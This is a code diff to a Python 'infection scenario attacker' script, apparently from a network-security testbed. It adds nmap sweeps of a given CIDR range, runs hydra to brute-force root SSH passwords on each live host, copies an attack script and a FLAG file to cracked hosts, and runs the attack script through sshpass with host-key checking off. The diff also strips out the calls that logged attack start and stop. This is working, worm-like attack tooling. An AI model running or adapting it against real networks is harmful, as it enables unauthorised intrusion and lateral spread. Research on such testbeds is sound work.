@@ -1,46 +1,95 @@
 import subprocess
 import os
-import json
+import re
 
 import argparse
 
+def run_command(cmd, check=True):
+  """Run a shell command and return the output."""
+  print(f"[+] Running: {' '.join(cmd) if isinstance(cmd, list) else cmd}")
+  result = subprocess.run(cmd, capture_output=True, text=True)
+  if check and result.returncode != 0:
+    print(f"[-] Command failed: {result.stderr}")
+    return None
+  return result.stdout.strip() if result.stdout else None
+
+def discover_hosts(cidr):
+  """Discover live hosts in the given CIDR range using nmap."""
+  print(f"[+] Discovering live hosts in {cidr}...")
+  # Use nmap ping scan to discover live hosts
+  nmap_result = run_command(['nmap', '-sn', cidr], check=False)
+  if not nmap_result:
+    print("[-] nmap discovery failed or no hosts found")
+    return []
+  
+  # Parse nmap output to extract live hosts
+  # nmap outputs lines like: "Nmap scan report for 192.168.1.1"
+  # Host is up, indicating it's live
+  live_hosts = []
+  current_host = None
+  for line in nmap_result.split('\n'):
+    if 'Nmap scan report for' in line:
+      current_host = line.split('for')[-1].strip()
+    elif 'Host is up' in line and current_host:
+      # Make sure it's not marked as down
+      if 'down' not in line.lower():
+        live_hosts.append(current_host)
+      current_host = None
+  
+  print(f"[+] Found {len(live_hosts)} live hosts: {live_hosts}")
+  return live_hosts
+
 def main():
   # Load argparse
-  parser = argparse.ArgumentParser(description='Run hydra to crack SSH passwords')
-  # Add nodeactor name target of the attack
-  parser.add_argument('nodeactor_target', type=str, help='The name of the nodeactor to attack')
+  parser = argparse.ArgumentParser(description='Infection scenario attacker - dynamically scan and attack target networks')
+  
+  # Support for --target argument and TARGET_NETWORK environment variable
+  parser.add_argument('--target', type=str, help='Target network in CIDR notation (e.g., 192.168.1.0/24)')
   parser.add_argument("--skip_hydra", action="store_true", help="Skip hydra and just copy the FLAG file")
 
   args = parser.parse_args()
 
   skip_hydra = args.skip_hydra
-  nodeactor_target = args.nodeactor_target
+
   # Set the log file name
   log_hydra_fname = 'log_hydra.txt'
-  # Other examples that could be uncommented
-  # log_hydra_fname = 'example_log_hydra.txt'
-  # log_hydra_fname = 'example_log_hydra_with_err.txt'
 
-  # Get the target IP from the command line arguments
-
-  # load IP_LIST_DATA from /MENTORED_IP_LIST.json
-  with open('/MENTORED_IP_LIST.json', 'r') as f:
-    IP_LIST_DATA = json.load(f)
+  # Get target network from CLI argument or environment variable
+  target_network = args.target or os.environ.get('TARGET_NETWORK', '')
   
-  exp_iface = os.environ.get('MENTORED_EXP_IFNAME', 'net1')
-  vulnerable_ips = []
-  for nodeactor_name, nodeactor_data in IP_LIST_DATA.items():
-    if nodeactor_name != nodeactor_target:
-      continue
-    for pod in nodeactor_data:
-      # find the ip address related to exp_iface
-      is_exp_iface = [x[2]==exp_iface for x in pod]
-      # find index in is_exp_iface that is True
-      idx = is_exp_iface.index(True)
-      ip = pod[idx][0]
-      vulnerable_ips.append(ip)
+  if not target_network:
+    # Fallback: try to get from MENTORED_IP_LIST.json if it exists
+    print("[-] No target network specified via --target or TARGET_NETWORK env var")
+    if os.path.exists('/MENTORED_IP_LIST.json'):
+      print("[+] Falling back to MENTORED_IP_LIST.json")
+      import json
+      with open('/MENTORED_IP_LIST.json', 'r') as f:
+        IP_LIST_DATA = json.load(f)
+      
+      exp_iface = os.environ.get('MENTORED_EXP_IFNAME', 'net1')
+      vulnerable_ips = []
+      for nodeactor_name, nodeactor_data in IP_LIST_DATA.items():
+        for pod in nodeactor_data:
+          # find the ip address related to exp_iface
+          is_exp_iface = [x[2]==exp_iface for x in pod]
+          if any(is_exp_iface):
+            idx = is_exp_iface.index(True)
+            ip = pod[idx][0]
+            vulnerable_ips.append(ip)
+      
+      vulnerable_ips_list = vulnerable_ips
+      print(f"[+] Found {len(vulnerable_ips_list)} IPs from MENTORED_IP_LIST.json")
+    else:
+      print("[-] No target network specified and no MENTORED_IP_LIST.json found. Exiting.")
+      return
+  else:
+    # Discover live hosts in the target CIDR range
+    vulnerable_ips_list = discover_hosts(target_network)
+    if not vulnerable_ips_list:
+      print("[-] No live hosts found. Exiting.")
+      return
 
-  print(vulnerable_ips)
+  print(f"[+] Target IPs: {vulnerable_ips_list}")
 
   # Load PASSW_LIST from env
   if 'PASSW_LIST' in os.environ:
@@ -64,17 +113,14 @@ def main():
   subprocesses = []
 
   found_pwd = {}
-  for target_ip in vulnerable_ips:
+  for target_ip in vulnerable_ips_list:
     if not skip_hydra:
       print(f'Starting hydra for {target_ip}')
-      # Run os command
-      os.system(f'mentored-registry-action --source_ports 22 --destination_ports 22 -a attack-sshbruteforce -o /app/results/ -n "Starting bruteforce ssh attack" -t {target_ip}')
       # Run hydra and redirect output to the log file
       with open(log_hydra_fname, 'w') as log_file:
         subprocess.run(['hydra', '-l', 'root', '-P', password_list, '-s', '22', '-f', target_ip, 'ssh'], 
               stdout=log_file, stderr=subprocess.STDOUT)
 
-      os.system(f'mentored-registry-action --source_ports 22 --destination_ports 22 -a attack-stop-sshbruteforce -o /app/results/ -n "Stopping bruteforce ssh attack" -t {target_ip}')
       print(f'Finished hydra for {target_ip}')
 
     # Check for errors in the log file
@@ -120,30 +166,6 @@ def main():
             f'root@{target_ip}:/file_attack_cmd.sh'])
 
   for target_ip, ssh_password in found_pwd.items():
-
-          # subprocess.run([
-          #   'sshpass',
-          #   '-p',
-          #   ssh_password,
-          #   'ssh',
-          #   '-o',
-          #   'StrictHostKeyChecking=no',
-          #   f'root@{target_ip}',
-          #   command])
-
-          # subprocess.Popen([
-          #   'sshpass',
-          #   '-p',
-          #   ssh_password,
-          #   'ssh',
-          #   '-o',
-          #   'StrictHostKeyChecking=no',
-          #   f'root@{target_ip}',
-          #   "bash /file_attack_cmd.sh"],
-          #   stdout=subprocess.PIPE,
-          #   stderr=subprocess.STDOUT,
-          #   stdin=subprocess.DEVNULL)
-
           subprocesses.append(subprocess.Popen([
               'sshpass',
               '-p',
